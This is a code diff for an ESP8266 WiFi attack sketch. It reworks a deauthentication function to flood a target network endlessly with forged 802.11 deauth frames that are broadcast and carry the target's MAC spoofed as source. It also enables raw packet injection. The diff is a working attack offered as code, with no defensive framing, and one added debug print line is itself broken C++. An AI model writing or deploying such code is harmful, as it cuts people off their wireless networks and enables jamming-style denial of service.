@@ -1,3 +1,7 @@
+extern "C" {
+  #include <user_interface.h>
+}
+
 #include <ESP8266WiFi.h>
 #include <ESP8266WebServer.h>
 #include <lwip/etharp.h>
@@ -157,22 +161,27 @@ void handleARP() {
 
 // Deauth função1
 void deauthAttack(uint8_t *targetMac) {
-  for (int i = 0; i < 100; i++) {
+  Serial.println("Sending Deauth Attack");
+  while (1) {
     sendDeauthFrame(targetMac);
-    delay(10);
+    delay(5);
   }
 }
 
 // Deauth função2
 void sendDeauthFrame(uint8_t *targetMac) {
   uint8_t deauthPacket[] = {
-    0xC0, 0x00, 0x3A, 0x01,
+    0xC0, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
     targetMac[0], targetMac[1], targetMac[2],
     targetMac[3], targetMac[4], targetMac[5],
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    targetMac[0], targetMac[1], targetMac[2],
+    targetMac[3], targetMac[4], targetMac[5],
     0x00, 0x00,
-    0x07, 0x00
+    0x01, 0x00
   };
+  wifi_set_opmode(STATION_MODE);
+  wifi_promiscuous_enable(0);
   wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
 }
 
@@ -187,6 +196,7 @@ void handleAttackDeauth() {
     WiFi.disconnect();
 
     sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &targetMac[0], &targetMac[1], &targetMac[2], &targetMac[3], &targetMac[4], &targetMac[5]);
+    Serial.println("" + targetMac[0] + targetMac[1] + targetMac[2] + targetMac[3] + targetMac[4] + targetMac[5]);
 
     wifi_set_channel(targetChannel);
     deauthAttack(targetMac);
